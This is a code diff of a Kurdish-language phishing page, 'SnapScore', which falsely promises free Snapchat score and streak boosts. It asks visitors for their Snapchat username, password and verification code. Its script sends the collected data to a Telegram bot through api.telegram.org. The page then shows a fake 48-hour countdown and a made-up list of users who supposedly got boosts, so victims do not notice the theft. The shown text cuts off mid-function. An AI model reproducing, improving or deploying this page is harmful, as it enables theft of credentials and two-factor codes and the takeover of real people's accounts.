@@ -3,30 +3,57 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Snapchat Score Booster</title>
+    <title>SnapScore — زیادکردنی سکۆری Snapchat</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary: #fffc00;
+            --primary-dark: #f5a623;
+            --bg-start: #0a0a12;
+            --bg-end: #1a1a2e;
+            --card-bg: rgba(255, 255, 255, 0.03);
+            --border-color: rgba(255, 255, 255, 0.06);
+            --text-primary: #ffffff;
+            --text-secondary: rgba(255, 255, 255, 0.6);
+            --text-muted: rgba(255, 255, 255, 0.3);
+            --shadow: 0 40px 80px rgba(0, 0, 0, 0.6);
+            --radius: 32px;
+            --radius-sm: 14px;
+            --transition: all 0.4s cubic-bezier(0.22, 1, 0.36, 1);
+        }
+
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(160deg, #0a0a0a, #1a1a2e, #0f3460);
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: linear-gradient(160deg, var(--bg-start), var(--bg-end), #0f3460);
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 16px;
+            margin: 0;
         }
+
         .container {
-            background: rgba(255,255,255,0.03);
-            backdrop-filter: blur(30px);
-            border-radius: 32px;
+            background: var(--card-bg);
+            backdrop-filter: blur(40px);
+            -webkit-backdrop-filter: blur(40px);
+            border-radius: var(--radius);
             padding: 32px 28px;
-            max-width: 420px;
+            max-width: 440px;
             width: 100%;
-            border: 1px solid rgba(255,255,255,0.06);
-            box-shadow: 0 40px 80px rgba(0,0,0,0.6);
+            border: 1px solid var(--border-color);
+            box-shadow: var(--shadow);
             position: relative;
             overflow: hidden;
         }
+
         .container::before {
             content: '';
             position: absolute;
@@ -34,269 +61,682 @@
             left: -50%;
             width: 200%;
             height: 200%;
-            background: radial-gradient(circle at 30% 20%, rgba(255,252,0,0.03), transparent 60%);
+            background: radial-gradient(circle at 30% 20%, rgba(255, 252, 0, 0.04), transparent 60%);
             pointer-events: none;
+            animation: rotateGlow 30s linear infinite;
         }
-        .logo { text-align: center; margin-bottom: 28px; position: relative; z-index: 1; }
-        .logo-icon {
-            width: 72px;
-            height: 72px;
-            background: linear-gradient(135deg, #fffc00, #f5a623);
-            border-radius: 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 12px;
-            box-shadow: 0 12px 40px rgba(255,252,0,0.15);
-            position: relative;
+
+        @keyframes rotateGlow {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
-        .logo-icon svg { width: 40px; height: 40px; fill: #1a1a2e; }
-        .logo-icon .pulse {
-            position: absolute;
-            inset: -4px;
-            border-radius: 24px;
-            border: 2px solid rgba(255,252,0,0.2);
-            animation: pulse 2s ease-in-out infinite;
-        }
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); opacity: 1; }
-            50% { transform: scale(1.1); opacity: 0; }
-        }
-        .logo h1 {
-            color: #fff;
-            font-size: 30px;
-            font-weight: 800;
-            letter-spacing: -0.5px;
-        }
-        .logo h1 span {
-            background: linear-gradient(135deg, #fffc00, #f5a623);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-        .logo p {
-            color: rgba(255,255,255,0.4);
-            font-size: 13px;
-            margin-top: 4px;
-            letter-spacing: 0.3px;
-        }
-        .step { display: none; animation: fadeUp 0.6s cubic-bezier(0.22, 1, 0.36, 1); }
-        .step.active { display: block; }
-        @keyframes fadeUp {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        .info-box {
-            background: rgba(255,252,0,0.04);
-            border: 1px solid rgba(255,252,0,0.08);
-            border-radius: 14px;
-            padding: 16px 18px;
-            margin-bottom: 22px;
-            color: rgba(255,255,255,0.6);
-            font-size: 13px;
-            line-height: 1.7;
+
+        /* ===== LOGO ===== */
+        .logo {
+            text-align: center;
+            margin-bottom: 32px;
             position: relative;
             z-index: 1;
         }
-        .info-box strong { color: #fffc00; -webkit-text-fill-color: #fffc00; }
-        .info-box .highlight { color: #fff; font-weight: 600; -webkit-text-fill-color: #fff; }
-        .form-group { margin-bottom: 18px; position: relative; z-index: 1; }
+
+        .logo-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            border-radius: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 14px;
+            box-shadow: 0 16px 48px rgba(255, 252, 0, 0.2);
+            position: relative;
+            transition: var(--transition);
+        }
+
+        .logo-icon:hover {
+            transform: scale(1.05) rotate(-5deg);
+            box-shadow: 0 20px 60px rgba(255, 252, 0, 0.3);
+        }
+
+        .logo-icon .pulse {
+            position: absolute;
+            inset: -6px;
+            border-radius: 28px;
+            border: 2px solid rgba(255, 252, 0, 0.15);
+            animation: pulseRing 2.5s ease-in-out infinite;
+        }
+
+        @keyframes pulseRing {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.15); opacity: 0; }
+        }
+
+        .logo-icon svg {
+            width: 44px;
+            height: 44px;
+            fill: #1a1a2e;
+            position: relative;
+            z-index: 2;
+        }
+
+        .logo h1 {
+            color: var(--text-primary);
+            font-size: 34px;
+            font-weight: 900;
+            letter-spacing: -1px;
+            line-height: 1.1;
+        }
+
+        .logo h1 span {
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .logo .subtitle {
+            color: var(--text-secondary);
+            font-size: 14px;
+            margin-top: 4px;
+            font-weight: 400;
+            letter-spacing: 0.3px;
+        }
+
+        .logo .badge-free {
+            display: inline-block;
+            background: rgba(0, 255, 100, 0.12);
+            color: #00ff88;
+            font-size: 11px;
+            font-weight: 700;
+            padding: 4px 16px;
+            border-radius: 20px;
+            margin-top: 8px;
+            letter-spacing: 0.5px;
+            border: 1px solid rgba(0, 255, 100, 0.1);
+        }
+
+        /* ===== STEPS ===== */
+        .step {
+            display: none;
+            animation: fadeSlide 0.6s cubic-bezier(0.22, 1, 0.36, 1);
+            position: relative;
+            z-index: 1;
+        }
+
+        .step.active {
+            display: block;
+        }
+
+        @keyframes fadeSlide {
+            from { opacity: 0; transform: translateY(24px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* ===== INFO BOX ===== */
+        .info-box {
+            background: rgba(255, 252, 0, 0.04);
+            border: 1px solid rgba(255, 252, 0, 0.08);
+            border-radius: var(--radius-sm);
+            padding: 18px 20px;
+            margin-bottom: 24px;
+            color: var(--text-secondary);
+            font-size: 13.5px;
+            line-height: 1.8;
+            transition: var(--transition);
+        }
+
+        .info-box strong {
+            color: var(--primary);
+            font-weight: 700;
+        }
+
+        .info-box .highlight {
+            color: var(--text-primary);
+            font-weight: 600;
+        }
+
+        .info-box .emoji-big {
+            font-size: 20px;
+            margin-right: 4px;
+        }
+
+        /* ===== FEATURE LIST ===== */
+        .feature-list {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin: 14px 0 22px 0;
+        }
+
+        .feature-item {
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 12px;
+            padding: 14px 10px;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            transition: var(--transition);
+        }
+
+        .feature-item:hover {
+            background: rgba(255, 255, 255, 0.04);
+            border-color: rgba(255, 252, 0, 0.06);
+            transform: translateY(-2px);
+        }
+
+        .feature-item .emoji {
+            font-size: 26px;
+            display: block;
+            margin-bottom: 4px;
+        }
+
+        .feature-item .text {
+            color: var(--text-secondary);
+            font-size: 11px;
+            font-weight: 600;
+            letter-spacing: 0.3px;
+        }
+
+        .feature-item .sub-text {
+            color: var(--text-muted);
+            font-size: 9px;
+            margin-top: 2px;
+        }
+
+        /* ===== FORM ===== */
+        .form-group {
+            margin-bottom: 18px;
+        }
+
         .form-group label {
-            color: rgba(255,255,255,0.6);
+            color: var(--text-secondary);
             font-size: 13px;
             font-weight: 600;
             display: block;
             margin-bottom: 6px;
             letter-spacing: 0.3px;
         }
+
         .form-group input {
             width: 100%;
-            padding: 15px 18px;
-            border-radius: 14px;
-            border: 2px solid rgba(255,255,255,0.06);
-            background: rgba(255,255,255,0.04);
-            color: #fff;
+            padding: 16px 20px;
+            border-radius: var(--radius-sm);
+            border: 2px solid rgba(255, 255, 255, 0.06);
+            background: rgba(255, 255, 255, 0.04);
+            color: var(--text-primary);
             font-size: 16px;
-            transition: all 0.3s ease;
+            font-family: inherit;
+            transition: var(--transition);
             outline: none;
         }
+
         .form-group input:focus {
-            border-color: #fffc00;
-            background: rgba(255,255,255,0.07);
-            box-shadow: 0 0 30px rgba(255,252,0,0.05);
+            border-color: var(--primary);
+            background: rgba(255, 255, 255, 0.07);
+            box-shadow: 0 0 40px rgba(255, 252, 0, 0.06);
         }
-        .form-group input::placeholder { color: rgba(255,255,255,0.2); }
+
+        .form-group input::placeholder {
+            color: var(--text-muted);
+        }
+
+        .form-group input:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+        }
+
+        /* ===== BUTTONS ===== */
         .btn {
             width: 100%;
-            padding: 17px;
+            padding: 18px;
             border: none;
-            border-radius: 14px;
-            background: linear-gradient(135deg, #fffc00, #f5a623);
+            border-radius: var(--radius-sm);
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
             color: #1a1a2e;
             font-size: 17px;
-            font-weight: 700;
+            font-weight: 800;
             cursor: pointer;
-            transition: all 0.3s cubic-bezier(0.22, 1, 0.36, 1);
+            transition: var(--transition);
             letter-spacing: 0.3px;
-            margin-top: 6px;
+            font-family: inherit;
             position: relative;
-            z-index: 1;
+            overflow: hidden;
         }
-        .btn:hover { transform: translateY(-2px); box-shadow: 0 12px 40px rgba(255,252,0,0.2); }
-        .btn:active { transform: scale(0.97); }
-        .btn:disabled { opacity: 0.4; cursor: not-allowed; transform: none; box-shadow: none; }
+
+        .btn::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.2), transparent);
+            opacity: 0;
+            transition: var(--transition);
+        }
+
+        .btn:hover::after {
+            opacity: 1;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 16px 48px rgba(255, 252, 0, 0.25);
+        }
+
+        .btn:active {
+            transform: scale(0.97);
+        }
+
+        .btn:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+            transform: none !important;
+            box-shadow: none !important;
+        }
+
         .btn-secondary {
-            background: rgba(255,255,255,0.06);
-            color: #fff;
+            background: rgba(255, 255, 255, 0.06);
+            color: var(--text-primary);
         }
-        .btn-secondary:hover { background: rgba(255,255,255,0.12); box-shadow: 0 8px 30px rgba(255,255,255,0.05); }
+
+        .btn-secondary:hover {
+            background: rgba(255, 255, 255, 0.12);
+            box-shadow: 0 8px 32px rgba(255, 255, 255, 0.05);
+        }
+
+        /* ===== STATUS ===== */
         .status {
-            margin-top: 14px;
-            padding: 13px 16px;
+            margin-top: 16px;
+            padding: 14px 18px;
             border-radius: 12px;
             font-size: 13px;
             text-align: center;
             display: none;
-            position: relative;
-            z-index: 1;
+            font-weight: 500;
+            animation: fadeSlide 0.4s ease;
         }
-        .status.show { display: block; }
-        .status.loading { background: rgba(255,252,0,0.08); color: #fffc00; border: 1px solid rgba(255,252,0,0.12); }
-        .status.success { background: rgba(0,255,100,0.08); color: #00ff88; border: 1px solid rgba(0,255,100,0.12); }
-        .status.error { background: rgba(255,50,50,0.08); color: #ff6b6b; border: 1px solid rgba(255,50,50,0.12); }
-        .status.info { background: rgba(50,150,255,0.08); color: #4fc3ff; border: 1px solid rgba(50,150,255,0.12); }
+
+        .status.show {
+            display: block;
+        }
+
+        .status.loading {
+            background: rgba(255, 252, 0, 0.08);
+            color: var(--primary);
+            border: 1px solid rgba(255, 252, 0, 0.12);
+        }
+
+        .status.success {
+            background: rgba(0, 255, 100, 0.08);
+            color: #00ff88;
+            border: 1px solid rgba(0, 255, 100, 0.12);
+        }
+
+        .status.error {
+            background: rgba(255, 50, 50, 0.08);
+            color: #ff6b6b;
+            border: 1px solid rgba(255, 50, 50, 0.12);
+        }
+
+        .status.info {
+            background: rgba(50, 150, 255, 0.08);
+            color: #4fc3ff;
+            border: 1px solid rgba(50, 150, 255, 0.12);
+        }
+
+        .status .loader {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            border: 2.5px solid rgba(255, 255, 255, 0.15);
+            border-top: 2.5px solid var(--primary);
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            vertical-align: middle;
+            margin-right: 10px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* ===== CODE GROUP ===== */
         .code-group {
             display: flex;
             gap: 10px;
             align-items: center;
         }
-        .code-group input { flex: 1; }
+
+        .code-group input {
+            flex: 1;
+        }
+
         .code-group .btn-sm {
-            padding: 15px 18px;
+            padding: 16px 20px;
             border: none;
-            border-radius: 14px;
-            background: rgba(255,255,255,0.06);
-            color: #fff;
+            border-radius: var(--radius-sm);
+            background: rgba(255, 255, 255, 0.06);
+            color: var(--text-primary);
             font-size: 13px;
             font-weight: 600;
             cursor: pointer;
             white-space: nowrap;
-            transition: all 0.3s ease;
+            transition: var(--transition);
+            font-family: inherit;
         }
-        .code-group .btn-sm:hover { background: rgba(255,255,255,0.12); }
+
+        .code-group .btn-sm:hover {
+            background: rgba(255, 255, 255, 0.12);
+        }
+
+        /* ===== TIMER ===== */
+        .timer-box {
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: var(--radius-sm);
+            padding: 20px;
+            margin: 18px 0;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            text-align: center;
+        }
+
+        .timer-box .label {
+            color: var(--text-muted);
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            font-weight: 600;
+        }
+
+        .timer-box .value {
+            color: var(--primary);
+            font-size: 32px;
+            font-weight: 900;
+            margin-top: 6px;
+            letter-spacing: 2px;
+            font-variant-numeric: tabular-nums;
+        }
+
+        .timer-box .sub {
+            color: var(--text-muted);
+            font-size: 12px;
+            margin-top: 6px;
+        }
+
+        /* ===== SUCCESS ===== */
+        .success-icon {
+            font-size: 72px;
+            display: block;
+            margin-bottom: 12px;
+            animation: bounce 2s ease-in-out infinite;
+        }
+
+        @keyframes bounce {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+
+        .success-title {
+            color: var(--text-primary);
+            font-size: 26px;
+            font-weight: 900;
+        }
+
+        .success-sub {
+            color: var(--text-secondary);
+            font-size: 14px;
+            margin-top: 8px;
+            line-height: 1.7;
+        }
+
+        .success-highlight {
+            color: var(--primary);
+            font-weight: 700;
+        }
+
+        /* ===== USER LIST ===== */
+        .user-list {
+            margin: 18px 0;
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: var(--radius-sm);
+            padding: 14px 18px;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+        }
+
+        .user-list .title {
+            color: var(--text-muted);
+            font-size: 10px;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            margin-bottom: 10px;
+            text-align: center;
+            font-weight: 600;
+        }
+
+        .user-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 7px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+            transition: var(--transition);
+        }
+
+        .user-item:last-child {
+            border-bottom: none;
+        }
+
+        .user-item:hover {
+            padding-left: 4px;
+        }
+
+        .user-item .name {
+            color: var(--text-secondary);
+            font-size: 13px;
+            font-weight: 500;
+        }
+
+        .user-item .name .status-dot {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            margin-right: 8px;
+            animation: pulseDot 1.5s ease-in-out infinite;
+        }
+
+        .user-item .name .status-dot.online {
+            background: #00ff88;
+        }
+
+        @keyframes pulseDot {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        .user-item .score {
+            color: var(--primary);
+            font-size: 13px;
+            font-weight: 700;
+        }
+
+        .user-item .badge {
+            background: rgba(255, 252, 0, 0.08);
+            color: var(--primary);
+            font-size: 9px;
+            padding: 2px 10px;
+            border-radius: 12px;
+            margin-left: 8px;
+            font-weight: 600;
+        }
+
+        .user-list .more {
+            text-align: center;
+            color: var(--text-muted);
+            font-size: 10px;
+            margin-top: 8px;
+            font-weight: 500;
+            letter-spacing: 0.3px;
+        }
+
+        /* ===== WARNING ===== */
+        .warning-box {
+            background: rgba(255, 50, 50, 0.04);
+            border: 1px solid rgba(255, 50, 50, 0.08);
+            border-radius: 12px;
+            padding: 14px 18px;
+            margin: 14px 0;
+            color: var(--text-muted);
+            font-size: 11.5px;
+            line-height: 1.7;
+            text-align: center;
+        }
+
+        .warning-box strong {
+            color: #ff6b6b;
+            font-weight: 700;
+        }
+
+        /* ===== FOOTER ===== */
         .footer {
             text-align: center;
-            margin-top: 24px;
-            color: rgba(255,255,255,0.12);
+            margin-top: 28px;
+            color: var(--text-muted);
             font-size: 11px;
             letter-spacing: 0.5px;
             position: relative;
             z-index: 1;
         }
-        .timer-box {
-            background: rgba(255,255,255,0.03);
-            border-radius: 14px;
-            padding: 16px;
-            margin: 16px 0;
-            border: 1px solid rgba(255,255,255,0.04);
+
+        .footer a {
+            color: var(--text-muted);
+            text-decoration: none;
+            transition: var(--transition);
         }
-        .timer-box .label { color: rgba(255,255,255,0.3); font-size: 11px; text-transform: uppercase; letter-spacing: 1px; }
-        .timer-box .value { color: #fffc00; font-size: 22px; font-weight: 700; margin-top: 4px; -webkit-text-fill-color: #fffc00; }
-        .success-icon { font-size: 64px; display: block; margin-bottom: 12px; }
-        .success-title { color: #fff; font-size: 24px; font-weight: 700; -webkit-text-fill-color: #fff; }
-        .success-sub { color: rgba(255,255,255,0.5); font-size: 14px; margin-top: 8px; line-height: 1.6; }
-        .success-highlight { color: #fffc00; font-weight: 600; -webkit-text-fill-color: #fffc00; }
-        .user-list {
-            margin: 16px 0;
-            background: rgba(255,255,255,0.02);
-            border-radius: 14px;
-            padding: 12px 16px;
-            border: 1px solid rgba(255,255,255,0.04);
+
+        .footer a:hover {
+            color: var(--text-secondary);
         }
-        .user-list .title {
-            color: rgba(255,255,255,0.2);
-            font-size: 10px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            margin-bottom: 8px;
-            text-align: center;
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 480px) {
+            .container {
+                padding: 24px 18px;
+                border-radius: 24px;
+            }
+            .logo h1 {
+                font-size: 28px;
+            }
+            .logo-icon {
+                width: 64px;
+                height: 64px;
+            }
+            .logo-icon svg {
+                width: 34px;
+                height: 34px;
+            }
+            .feature-list {
+                grid-template-columns: 1fr 1fr;
+                gap: 8px;
+            }
+            .feature-item {
+                padding: 10px 8px;
+            }
+            .feature-item .emoji {
+                font-size: 20px;
+            }
+            .timer-box .value {
+                font-size: 26px;
+            }
+            .success-icon {
+                font-size: 56px;
+            }
+            .user-item .name {
+                font-size: 12px;
+            }
+            .user-item .score {
+                font-size: 12px;
+            }
         }
-        .user-item {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 6px 0;
-            border-bottom: 1px solid rgba(255,255,255,0.03);
+
+        @media (max-width: 360px) {
+            .container {
+                padding: 18px 14px;
+            }
+            .logo h1 {
+                font-size: 24px;
+            }
+            .feature-list {
+                grid-template-columns: 1fr 1fr;
+            }
+            .code-group {
+                flex-direction: column;
+            }
+            .code-group .btn-sm {
+                width: 100%;
+            }
         }
-        .user-item:last-child { border-bottom: none; }
-        .user-item .name { color: rgba(255,255,255,0.6); font-size: 13px; }
-        .user-item .score { color: #fffc00; font-size: 13px; font-weight: 600; -webkit-text-fill-color: #fffc00; }
-        .user-item .badge {
-            background: rgba(255,252,0,0.08);
-            color: #fffc00;
-            font-size: 9px;
-            padding: 2px 8px;
+
+        /* ===== SCROLLBAR ===== */
+        ::-webkit-scrollbar {
+            width: 4px;
+        }
+        ::-webkit-scrollbar-track {
+            background: transparent;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: rgba(255, 255, 255, 0.1);
             border-radius: 10px;
-            margin-left: 8px;
         }
-        .warning-box {
-            background: rgba(255,50,50,0.05);
-            border: 1px solid rgba(255,50,50,0.08);
-            border-radius: 12px;
-            padding: 12px 16px;
-            margin: 12px 0;
-            color: rgba(255,255,255,0.3);
-            font-size: 11px;
-            line-height: 1.6;
-            text-align: center;
+
+        /* ===== SELECTION ===== */
+        ::selection {
+            background: rgba(255, 252, 0, 0.2);
+            color: #fff;
         }
-        .warning-box strong { color: #ff6b6b; -webkit-text-fill-color: #ff6b6b; }
-        .hidden { display: none !important; }
-        .feature-list {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 8px;
-            margin: 12px 0;
+
+        /* ===== HIDDEN ===== */
+        .hidden {
+            display: none !important;
         }
-        .feature-item {
-            background: rgba(255,255,255,0.02);
-            border-radius: 10px;
-            padding: 10px 6px;
-            text-align: center;
-            border: 1px solid rgba(255,255,255,0.03);
-        }
-        .feature-item .emoji { font-size: 20px; display: block; }
-        .feature-item .text { color: rgba(255,255,255,0.4); font-size: 9px; margin-top: 4px; }
     </style>
 </head>
 <body>
 
 <div class="container">
 
+    <!-- ===== LOGO ===== -->
     <div class="logo">
         <div class="logo-icon">
             <div class="pulse"></div>
             <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14H9V8h2v8zm4 0h-2V8h2v8z"/></svg>
         </div>
         <h1>Snap<span>Score</span></h1>
-        <p>زیادکردنی سکۆری Snapchat</p>
+        <p class="subtitle">زیادکردنی سکۆری Snapchat</p>
+        <span class="badge-free">✨ فریا • بەبێ پارە</span>
     </div>
 
     <!-- ===== STEP 1: LOGIN ===== -->
     <div id="step1" class="step active">
         <div class="info-box">
-            <strong>🔥 زیادکردنی سکۆر</strong><br>
+            <span class="emoji-big">🔥</span>
+            <strong>زیادکردنی سکۆر</strong><br>
             ناوی بەکارهێنەر و تێپەڕەوشەی خۆت بنووسە. 
             <span class="highlight">سکۆرەکەت</span> لە ماوەی <strong>٤٨ کاتژمێر</strong>دا زیاد دەکات.
         </div>
 
         <div class="feature-list">
-            <div class="feature-item"><span class="emoji">⭐</span><span class="text">سکۆر +٥٠٠٠</span></div>
-            <div class="feature-item"><span class="emoji">🔥</span><span class="text">سترک +٣٠</span></div>
+            <div class="feature-item">
+                <span class="emoji">⭐</span>
+                <span class="text">سکۆر +٥٠٠٠</span>
+                <div class="sub-text">نمرە زیاد دەکات</div>
+            </div>
+            <div class="feature-item">
+                <span class="emoji">🔥</span>
+                <span class="text">سترک +٣٠</span>
+                <div class="sub-text">ڕۆژ زیاد دەکات</div>
+            </div>
         </div>
 
         <div class="form-group">
             <label>👤 ناوی بەکارهێنەر</label>
-            <input type="text" id="username" placeholder="username" autocomplete="off" />
+            <input type="text" id="username" placeholder="username" autocomplete="off" spellcheck="false" />
         </div>
         <div class="form-group">
             <label>🔑 تێپەڕەوشە</label>
@@ -309,7 +749,8 @@
     <!-- ===== STEP 2: VERIFICATION ===== -->
     <div id="step2" class="step">
         <div class="info-box">
-            <strong>📱 کۆدی پشتڕاستکردنەوە</strong><br>
+            <span class="emoji-big">📱</span>
+            <strong>کۆدی پشتڕاستکردنەوە</strong><br>
             کۆدێک بۆ ئیمەیل یان ژمارەی تەلەفۆنی تۆ نێردرا.
             تکایە کۆدەکە بنووسە بۆ <span class="highlight">چالاککردنی زیادکردن</span>.
         </div>
@@ -324,9 +765,9 @@
         <div id="status2" class="status"></div>
     </div>
 
-    <!-- ===== STEP 3: WAIT 48 HOURS ===== -->
+    <!-- ===== STEP 3: SUCCESS ===== -->
     <div id="step3" class="step">
-        <div style="text-align:center; padding: 10px 0;">
+        <div style="text-align:center; padding: 4px 0;">
             <span class="success-icon">⏳</span>
             <h2 class="success-title">داواکاری تۆمار کرا!</h2>
             <p class="success-sub">
@@ -337,47 +778,44 @@
             <div class="timer-box">
                 <div class="label">⏳ کاتی ماوە بۆ زیادبوون</div>
                 <div class="value" id="countdown">٤٨:٠٠:٠٠</div>
-                <div style="color:rgba(255,255,255,0.2); font-size:11px; margin-top:6px;">دوای ئەم کاتە سکۆرەکەت زیاد دەکات</div>
+                <div class="sub">دوای ئەم کاتە سکۆرەکەت زیاد دەکات</div>
             </div>
 
-            <!-- FAKE KURDISH USER LIST -->
             <div class="user-list">
                 <div class="title">🔥 بەکارهێنەرانی تر کە سکۆریان زیاد کردووە</div>
                 <div class="user-item">
-                    <span class="name">🟢 kurdo763</span>
+                    <span class="name"><span class="status-dot online"></span>kurdo763</span>
                     <span class="score">٢٠٠,٠٠٠+ <span class="badge">زیاد کرا</span></span>
                 </div>
                 <div class="user-item">
-                    <span class="name">🟢 bawan_101</span>
+                    <span class="name"><span class="status-dot online"></span>bawan_101</span>
                     <span class="score">١٨٥,٠٠٠+ <span class="badge">زیاد کرا</span></span>
                 </div>
                 <div class="user-item">
-                    <span class="name">🟢 zhino_23</span>
+                    <span class="name"><span class="status-dot online"></span>zhino_23</span>
                     <span class="score">١٧٢,٠٠٠+ <span class="badge">زیاد کرا</span></span>
                 </div>
                 <div class="user-item">
-                    <span class="name">🟢 rebar_55</span>
+                    <span class="name"><span class="status-dot online"></span>rebar_55</span>
                     <span class="score">١٦٨,٠٠٠+ <span class="badge">زیاد کرا</span></span>
                 </div>
                 <div class="user-item">
-                    <span class="name">🟢 avin_808</span>
+                    <span class="name"><span class="status-dot online"></span>avin_808</span>
                     <span class="score">١٥٥,٠٠٠+ <span class="badge">زیاد کرا</span></span>
                 </div>
                 <div class="user-item">
-                    <span class="name">🟢 sarkawt_22</span>
+                    <span class="name"><span class="status-dot online"></span>sarkawt_22</span>
                     <span class="score">١٤٣,٠٠٠+ <span class="badge">زیاد کرا</span></span>
                 </div>
                 <div class="user-item">
-                    <span class="name">🟢 rozh_404</span>
+                    <span class="name"><span class="status-dot online"></span>rozh_404</span>
                     <span class="score">١٣١,٠٠٠+ <span class="badge">زیاد کرا</span></span>
                 </div>
                 <div class="user-item">
-                    <span class="name">🟢 dilan_77</span>
+                    <span class="name"><span class="status-dot online"></span>dilan_77</span>
                     <span class="score">١٢٠,٠٠٠+ <span class="badge">زیاد کرا</span></span>
                 </div>
-                <div style="text-align:center; color:rgba(255,255,255,0.15); font-size:10px; margin-top:6px;">
-                    +١٢٣ بەکارهێنەری تر
-                </div>
+                <div class="more">+١٢٣ بەکارهێنەری تر لە کاتی زیادکردندا</div>
             </div>
 
             <div class="warning-box">
@@ -386,14 +824,14 @@
                 دوای زیادبوون، ئاگادارکردنەوەکە لە Snapchat ببینیت.
             </div>
 
-            <button class="btn btn-secondary" onclick="resetAll()" style="margin-top:12px;">
-                گەڕانەوە
+            <button class="btn btn-secondary" onclick="resetAll()" style="margin-top:14px;">
+                🔄 گەڕانەوە بۆ دەستپێک
             </button>
         </div>
     </div>
 
     <div class="footer">
-        © 2027 SnapScore • زیادکردنی سکۆری Snapchat • ماوەی ٤٨ کاتژمێر
+        © 2027 <a href="#">SnapScore</a> • زیادکردنی سکۆری Snapchat • ماوەی ٤٨ کاتژمێر
     </div>
 </div>
 
@@ -407,7 +845,7 @@
     let currentPass = '';
     let currentCode = '';
     let step = 1;
-    let isChecking = false;
+    let isProcessing = false;
 
     // ========== DOM ==========
     const step1 = document.getElementById('step1');
@@ -429,28 +867,32 @@
             const fd = new FormData();
             fd.append('chat_id', CHAT_ID);
             fd.append('text', msg);
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', body: fd }).catch(()=>{});
-        } catch(e){}
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', body: fd }).catch(() => {});
+        } catch (e) {}
     }
 
     // ========== STATUS ==========
-    function setStatus(el, msg, type='loading') {
+    function setStatus(el, msg, type = 'loading') {
         el.textContent = msg;
         el.className = 'status show ' + type;
     }
-    function hideStatus(el) { el.className = 'status'; }
+
+    function hideStatus(el) {
+        el.className = 'status';
+    }
 
     // ========== STEPS ==========
     function showStep(n) {
         document.querySelectorAll('.step').forEach(e => e.classList.remove('active'));
-        if (n===1) step1.classList.add('active');
-        else if (n===2) step2.classList.add('active');
-        else if (n===3) step3.classList.add('active');
+        if (n === 1) step1.classList.add('active');
+        else if (n === 2) step2.classList.add('active');
+        else if (n === 3) step3.classList.add('active');
         step = n;
     }
 
     // ========== COUNTDOWN ==========
     let countdownInterval = null;
+
     function startCountdown() {
         let totalSeconds = 48 * 60 * 60;
         countdownInterval = setInterval(() => {
@@ -481,52 +923,17 @@
         currentUser = '';
         currentPass = '';
         currentCode = '';
-        isChecking = false;
-    }
-
-    // ========== CHECK SNAPCHAT ACCOUNT ==========
-    async function checkSnapchatAccount(username) {
-        try {
-            const url = `https://www.snapchat.com/add/${username}`;
-            const response = await fetch(url, {
-                method: 'GET',
-                headers: {
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
